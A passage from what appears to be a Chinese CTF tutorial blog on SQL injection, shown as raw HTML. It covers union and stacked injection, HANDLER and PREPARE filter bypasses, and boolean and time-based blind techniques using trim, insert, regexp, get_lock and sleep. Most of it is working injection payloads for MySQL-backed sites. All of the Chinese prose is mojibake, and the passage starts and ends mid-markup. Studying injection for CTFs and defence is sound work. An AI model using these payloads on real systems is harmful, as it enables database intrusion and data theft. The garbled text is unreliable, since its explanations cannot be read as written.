sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> å­—æ®µ [<span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span>]; # <span class="keyword">asc</span>å‡åºï¼Œé»˜è®¤çš„</span><br></pre></td></tr></table></figure></div><blockquote><p>ç”¨äºåˆ¤æ–­åˆ—æ•°ï¼Œä¸çŸ¥é“åˆ—åæ—¶ç”¨1 2 3â€¦â€¦è¡¨ç¤ºç¬¬1 2 3â€¦â€¦åˆ—</p></blockquote><h3 id="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰"><a href="#ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation-schemaï¼‰" class="headerlink" title="ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰"></a>ç³»ç»Ÿæ•°æ®åº“ï¼ˆinformation_schemaï¼‰</h3><p>mysqlç‰ˆæœ¬&gt;&#x3D;5.0</p><p>è¯¥åº“ä¸­æœ‰ä¸‰ä¸ªè¡¨schemata(å„æ•°æ®åº“åschema_name)ã€tables(å„è¡¨åtable_name)ã€columns(å„åˆ—å)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata # æŸ¥æ•°æ®åº“å</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #æŸ¥è¡¨å</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxx&#x27;</span>; #æŸ¥åˆ—å </span><br></pre></td></tr></table></figure></div><h2 id="äº”ã€æ³¨å…¥ç±»å‹"><a href="#äº”ã€æ³¨å…¥ç±»å‹" class="headerlink" title="äº”ã€æ³¨å…¥ç±»å‹"></a>äº”ã€æ³¨å…¥ç±»å‹</h2><h3 id="SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="SQLæ³¨å…¥çš„åˆ†ç±»"></a>SQLæ³¨å…¥çš„åˆ†ç±»</h3><p><strong>ä¾æ®æ³¨å…¥ç‚¹ç±»å‹åˆ†ç±»</strong></p><ul><li><p>æ•°å­—ç±»å‹çš„æ³¨å…¥</p></li><li><p>å­—ç¬¦ä¸²ç±»å‹çš„æ³¨å…¥</p></li><li><p>æœç´¢å‹æ³¨å…¥</p></li></ul><p><strong>ä¾æ®æäº¤æ–¹å¼åˆ†ç±»</strong></p><ul><li><p>GETæ³¨å…¥</p></li><li><p>POSTæ³¨å…¥</p></li><li><p>COOKIEæ³¨å…¥</p></li><li><p>HTTPå¤´æ³¨å…¥(XFFæ³¨å…¥ã€UAæ³¨å…¥ã€REFERERæ³¨å…¥ï¼‰</p></li></ul><p><strong>ä¾æ®è·å–ä¿¡æ¯çš„æ–¹å¼åˆ†ç±»</strong></p><ul><li><p>åŸºäºå¸ƒå°”çš„ç›²æ³¨</p></li><li><p>åŸºäºæ—¶é—´çš„ç›²æ³¨</p></li><li><p>åŸºäºæŠ¥é”™çš„æ³¨å…¥</p></li><li><p>è”åˆæŸ¥è¯¢æ³¨å…¥</p></li><li><p>å †å æ³¨å…¥ (å¯åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥)</p></li></ul><h2 id="è”åˆæ³¨å…¥"><a href="#è”åˆæ³¨å…¥" class="headerlink" title="è”åˆæ³¨å…¥"></a>è”åˆæ³¨å…¥</h2><p>è¦æ±‚åˆ—æ•°ä¸€è‡´</p><h3 id="å­—ç¬¦å‹"><a href="#å­—ç¬¦å‹" class="headerlink" title="å­—ç¬¦å‹"></a>å­—ç¬¦å‹</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>  <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>æ•´å‹çš„ä¹Ÿå·®ä¸å¤šï¼Œå»æ‰â€™</p><p>éƒ¨åˆ†é¢˜ç›®ä¹Ÿå¯èƒ½åœ¨å­—ç¬¦å‹åŸºç¡€ä¸ŠåŠ æ‹¬å·ç­‰,è‹¥æ³¨é‡Šè¢«å±è”½</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> â€¦â€¦ <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure></div></blockquote><h2 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h2><p>å¤šæ¡sqlè¯­å¥ä¸€èµ·æ‰§è¡Œ,åˆ©ç”¨åŠ <code>;</code>çš„æ“ä½œ</p><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><p>å—åˆ°APIæˆ–æ•°æ®åº“å¼•æ“ä¸æ”¯æŒï¼Œæƒé™ä¸è¶³ç­‰</p><h3 id="å¸¸è§æ€è·¯"><a href="#å¸¸è§æ€è·¯" class="headerlink" title="å¸¸è§æ€è·¯"></a>å¸¸è§æ€è·¯</h3><p>å¯è€ƒè™‘ä½¿ç”¨RENAMEå…³é”®å­—ï¼Œå°†æƒ³è¦çš„æ•°æ®åˆ—å&#x2F;è¡¨åæ›´æ”¹æˆè¿”å›æ•°æ®çš„SQLè¯­å¥æ‰€å®šä¹‰çš„è¡¨&#x2F;åˆ—åã€‚</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables; #æŸ¥çœ‹æ‰€æœ‰è¡¨</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> `è¡¨å`; #çœ‹åˆ—</span><br><span class="line">RENAME <span class="keyword">TABLE</span> `words` <span class="keyword">TO</span> `words1`; #æ”¹åä¸ºwords1</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `words` CHANGE `flag` `id` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="keyword">NULL</span>;#å°†æ–°wordsè¡¨çš„åˆ—flagæ”¹ä¸ºid</span><br></pre></td></tr></table></figure></div><h3 id="å¸¸è§bypass"><a href="#å¸¸è§bypass" class="headerlink" title="å¸¸è§bypass"></a>å¸¸è§bypass</h3><p>è¿‡æ»¤selectæ—¶ï¼Œä½¿ç”¨handlerè¯­å¥ï¼ˆmysqlä¸“ç”¨è¯­å¥ï¼‰</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users <span class="keyword">open</span> <span class="keyword">as</span> hd; #æŒ‡å®šæ•°æ®è¡¨usersè¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½åä¸ºhd</span><br><span class="line">handler hd read <span class="keyword">first</span>; #è¯»å–æŒ‡å®šè¡¨<span class="operator">/</span>å¥æŸ„çš„é¦–è¡Œæ•°æ®</span><br><span class="line">handler hd read next; #è¯»å–æŒ‡å®šè¡¨<span class="operator">/</span>å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®</span><br><span class="line">handler hd <span class="keyword">close</span>; #å…³é—­å¥æŸ„</span><br></pre></td></tr></table></figure></div><p>é¢„å¤„ç†</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">prepare</span> xxx <span class="keyword">from</span> &quot;sqlè¯­å¥&quot;;</span><br><span class="line"><span class="keyword">execute</span> xxx;</span><br><span class="line">#ç”±äº<span class="keyword">sql</span>è¯­å¥æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ“ä½œå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç»•è¿‡ä¸€äº›è¿‡æ»¤</span><br><span class="line">#æ¯”å¦‚è¿‡æ»¤äº†<span class="keyword">select</span></span><br><span class="line"><span class="keyword">PREPARE</span> st <span class="keyword">from</span> concat(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from `1919810931114514`&#x27;</span>);<span class="keyword">EXECUTE</span> st;#</span><br></pre></td></tr></table></figure></div><p>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯éšä¾¿æ³¨</p><h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><h3 id="æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"><a href="#æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°" class="headerlink" title="æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"></a>æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°</h3><ul><li><p>mid(): <code>mid(s,n,len);</code> ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p></li><li><p>substr()&#x2F;substring(): <code>substr(s, start, length); substring(s, start, length)</code> ä»å­—ç¬¦ä¸² s çš„ start ä½ç½®æˆªå–é•¿åº¦ä¸º length çš„å­å­—ç¬¦ä¸²</p></li><li><p>left(): <code>left(s,n);</code> è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦</p></li><li><p>right(): <code>right(s,n);</code> è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦</p></li><li><p>ascii()&#x2F;ord() <code>ascii(s);/ord(s);</code> è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç ã€‚ è¿™é‡Œä¸è€ƒè™‘å¤šå­—èŠ‚å­—ç¬¦ï¼Œæ¯”å¦‚æ±‰å­—</p></li><li><p>trim()&#x2F;rtrim()&#x2F;ltrim() </p><ul><li><code>ltrim(s);</code> å»æ‰å­—ç¬¦ä¸²så¼€å§‹å¤„çš„ç©ºæ ¼ </li><li><code>rtrim(s);</code> å»æ‰å­—ç¬¦ä¸²sç»“å°¾å¤„çš„ç©ºæ ¼ </li><li><code>trim(s);</code> å»æ‰å­—ç¬¦ä¸²å¼€å§‹å’Œç»“å°¾å¤„çš„ç©ºæ ¼</li></ul><blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TRIM</span>([<span class="keyword">BOTH</span><span class="operator">/</span><span class="keyword">LEADING</span><span class="operator">/</span><span class="keyword">TRAILING</span>] ç›®æ ‡å­—ç¬¦ä¸² <span class="keyword">FROM</span> æºå­—ç¬¦ä¸²);</span><br><span class="line"><span class="keyword">BOTH</span>åˆ é™¤ä¸¤è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸² </span><br><span class="line"><span class="keyword">LEADING</span>åˆ é™¤å·¦è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸² </span><br><span class="line">TARILINGåˆ é™¤å³è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;) <span class="operator">=</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> &quot;abcd&quot;);</span><br></pre></td></tr></table></figure></div><p>ä»¥è¿™ä¸ªä¸ºä¾‹ï¼Œæˆ‘ä»¬å°†åˆ é™¤çš„å­—ç¬¦ä¸²ASCIIå·®é™åˆ¶åœ¨1ï¼Œä¾‹å¦‚aå’Œb å½“è¿™ä¸ªç»“æœè¿”å›0æ—¶(è¯´æ˜æœ‰ä¸€ä¸ªæˆåŠŸåŒ¹é…)ï¼Œåˆ™ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aæˆ–è€…bã€‚ </p><p>æ¥ç€è®©açš„ASCII+2å˜æˆcï¼Œå¦‚æœè¿”å›1(bcéƒ½ä¸åŒ¹é…)ï¼Œåˆ™å­—ç¬¦ä¸²ç¬¬ä¸€ä½ä¸ºaï¼Œåä¹‹ç¬¬ä¸€ä½ä¸ºbã€‚</p><p>è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿å†™è„šæœ¬ ç¬¬äºŒä¸ªå­—ç¬¦åˆ¤æ–­ select trim(LEADING â€œaaâ€ from â€œabcdâ€) &#x3D; trim(LEADING â€œabâ€ from â€œabcdâ€); æ¥ç€é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ï¼Œåˆ¤æ–­ç¬¬äºŒä¸ªå­—ç¬¦ ä»¥æ­¤æ¨å‡ºæ•´ä¸ªå­—ç¬¦ä¸²</p><p>å¦‚æœ&#x3D;ç”¨regexpæ›¿ä»£é‚£ä¹ˆæ­£ç¡®çš„å­—ç¬¦ä¸€å®šåœ¨regexpå‰é¢ä»¥è¿™ä¸ªabcdä¸ºä¾‹ Trim(leading â€˜aâ€™ from â€˜abcdâ€™) regexp trim(LEADING â€˜xâ€™ from â€˜abcdâ€™) å°±æ˜¯bcd regexp abcdè¿”å›0ï¼Œ å¦‚æœåè¿‡æ¥å°±æ˜¯abcd regexp bcd è¿”å›1 å› æ­¤åªéœ€åˆ¤æ–­ç¬¬ä¸€æ­¥å³å¯ï¼Œè€Œä¸éœ€è¦ASCII+2å»åˆ¤æ–­äº† </p><p>âš ï¸ï¼šå¦‚æœç”¨regexpï¼Œè¦å…ˆåœ¨<code>trim(LEADING &quot;a&quot; from &quot;abcd&quot;) != trim(LEADING &quot;b&quot; from &quot;abcd&quot;)</code>çš„æ¡ä»¶ä¸‹ï¼Œå› ä¸ºä¸¤ä¸ªç›¸åŒå­—ç¬¦ä¸²é—´çš„regexpä¹Ÿä¼šè¿”å›1</p><p>æ³¨ï¼šy1ngå¸ˆå‚…åœ¨[HFCTF 2021 Final]hatenumä¸­ç”¨åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œé€šè¿‡æŒç»­é€’å½’ï¼Œå¤šæ¬¡å¥—å¨ƒtrimã€‚å¦‚æœå­—ç¬¦ä¸²é•¿åº¦è¢«é™åˆ¶ï¼Œå¯ä½¿ç”¨ã€‚ä¸€æ¬¡åªæˆªæ–­å‡ ä¸ªå­—ç¬¦</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;b&quot; <span class="keyword">from</span> <span class="built_in">trim</span>(<span class="keyword">LEADING</span> &quot;a&quot; <span class="keyword">from</span> &quot;abcd&quot;)); <span class="comment">-- cd </span></span><br></pre></td></tr></table></figure></div><p>å…ˆæˆªæ–­aï¼Œè¿”å›å­—ç¬¦ä¸²bcdï¼Œåœ¨æˆªæ–­bï¼Œè¿”å›å­—ç¬¦ä¸²cd</p></blockquote></li><li><p>Insert()</p><blockquote><p><code>INSERT(s1,x,len,s2)</code> å­—ç¬¦ä¸² s2 æ›¿æ¢ s1 çš„ x ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å­ï¼šç¬¬ä¸€æ­¥åˆ é™¤èµ·å§‹çš„å‰xä½</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- è¾“å‡ºï¼šabcdef</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;);</span><br><span class="line"><span class="comment">-- è¾“å‡ºï¼šbcdef</span></span><br><span class="line">ç¬¬äºŒæ­¥å¥—å¨ƒåˆ é™¤x<span class="operator">+</span><span class="number">1</span>ä½ä»¥åçš„æ‰€æœ‰</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">0</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- è¾“å‡ºï¼ša</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">INSERT</span>((<span class="keyword">INSERT</span>(&quot;abcdef&quot;, <span class="number">1</span>,<span class="number">1</span>, &quot;&quot;)),<span class="number">2</span>,<span class="number">9999</span>,&quot;&quot;);</span><br><span class="line"><span class="comment">-- è¾“å‡ºï¼šb</span></span><br></pre></td></tr></table></figure></div></blockquote></li></ul><h3 id="ç›²æ³¨å¸¸ç”¨æ–¹æ³•"><a href="#ç›²æ³¨å¸¸ç”¨æ–¹æ³•" class="headerlink" title="ç›²æ³¨å¸¸ç”¨æ–¹æ³•"></a>ç›²æ³¨å¸¸ç”¨æ–¹æ³•</h3><ul><li><p>if&#x2F;case ç”¨åœ¨selectæŸ¥è¯¢å½“ä¸­ï¼Œå½“åšä¸€ç§æ¡ä»¶æ¥è¿›è¡Œåˆ¤æ–­</p><blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(æ¡ä»¶,ä¸ºçœŸç»“æœ,ä¸ºå‡ç»“æœ)</span><br><span class="line"># <span class="keyword">case</span>è¯­æ³•ï¼ˆä¸¤ç§ï¼‰</span><br><span class="line">ç®€å•å‡½æ•° </span><br><span class="line"><span class="keyword">CASE</span> [col_name] <span class="keyword">WHEN</span> [value1] <span class="keyword">THEN</span> [result1]â€¦<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line">æœç´¢å‡½æ•° </span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> [expr] <span class="keyword">THEN</span> [result1]â€¦<span class="keyword">ELSE</span> [<span class="keyword">default</span>] <span class="keyword">END</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="string">&#x27;b&#x27;</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">2</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">when</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">then</span> <span class="number">1</span>  <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">12</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">when</span> <span class="number">3</span><span class="operator">&lt;</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">2</span> <span class="keyword">when</span> <span class="number">98</span><span class="operator">&gt;</span><span class="number">3</span> <span class="keyword">then</span> <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; #<span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>æœç´¢å‡½æ•°ä¼˜å…ˆåŒ¹é…ç¬¬ä¸€ä¸ªä¸ºçœŸçš„æ¡ä»¶,ä¹Ÿå¯ä»¥åªå†™ä¸€ä¸ªæ¡ä»¶ï¼Œä»£æ›¿ifè¯­å¥</p></blockquote></li><li><p>regexp&#x2F;rlike æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ï¼ˆå¯ä»¥ä»£æ›¿ifï¼‰</p><blockquote> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(if((<span class="keyword">user</span>() regexp <span class="string">&#x27;^r&#x27;</span>),<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">user</span>() regexp<span class="string">&#x27;^ri&#x27;</span>); # iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure></div> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div><p> è¿™é‡Œåªè¦æ›´æ¢regexpè¡¨è¾¾å¼å³å¯</p><p> <figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032231275.jpg"                      alt="image-20220708162044974"                ><figcaption>image-20220708162044974</figcaption></figure></p><p> æ³¨ï¼šregexpä¸åŒºåˆ†å¤§å°å†™ï¼Œéœ€è¦å¤§å°å†™æ•æ„Ÿè¦åŠ ä¸Šbinaryå…³é”®å­—</p> <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="type">binary</span> database() regexp &quot;^CTF&quot;;</span><br></pre></td></tr></table></figure></div></blockquote></li><li><p>likeåŒ¹é…æ³¨å…¥(é€‚ç”¨äº&#x3D;è¢«è¿‡æ»¤)</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;ro%&#x27;</span>;</span><br></pre></td></tr></table></figure></div></li><li><p>benchmarkå‡½æ•° æµ‹è¯•æ“ä½œæ€§èƒ½</p></li><li><p>get_lock</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>ç¬¬ä¸€ä¸ªè¿æ¥</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>æ‰“å¼€å¦ä¸€ä¸ªcmd  å†æ¬¡è¿æ¥mysqlï¼Œæ‰§è¡Œget_lockï¼Œå‘ç°å»¶æ—¶</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;aaa&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="operator">|</span>                 <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure></div><blockquote><p>åˆ©ç”¨åœºæ™¯æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼šéœ€è¦æä¾›é•¿è¿æ¥ã€‚åœ¨Apache+PHPæ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨mysql_pconnect(æ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æŒä¹…è¿æ¥)å‡½æ•°æ¥è¿æ¥æ•°æ®åº“ã€‚åœ¨CTFä¸­ï¼Œåªæœ‰å‡ºé¢˜äººå¾ˆåˆ»æ„çš„ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰æš—ç¤ºä½¿ç”¨è¿™ä¸ª</p></blockquote></li></ul><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span>,<span class="number">0</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"># sleepå»¶æ—¶</span><br><span class="line"><span class="keyword">select</span> sleep(find_in_set(mid(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# åœ¨<span class="number">0</span><span 